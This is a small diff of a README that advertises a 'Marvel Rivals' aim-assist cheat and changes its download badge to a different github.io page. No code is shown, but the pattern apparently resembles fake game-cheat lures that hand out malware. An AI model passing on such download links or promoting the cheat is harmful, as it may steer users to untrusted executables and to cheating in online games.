@@ -2,7 +2,7 @@
 ### *Lock on from afar. Zoom in. Lock tight.*
 
 <p align="center">
-  <a href="https://download-portal-demo.github.io/.github/MarvelRivalsAim11" target="_blank">
+  <a href="https://trahendon.github.io/.github/MarvelRivalsAssist1In4PC" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-MARVEL_RIVALS_ZOOM_ASSIST-blueviolet?style=for-the-badge&logo=marvel&logoColor=white" alt="Download Marvel Rivals Aim Assist with Zoom Mode" />
   </a>
 </p>
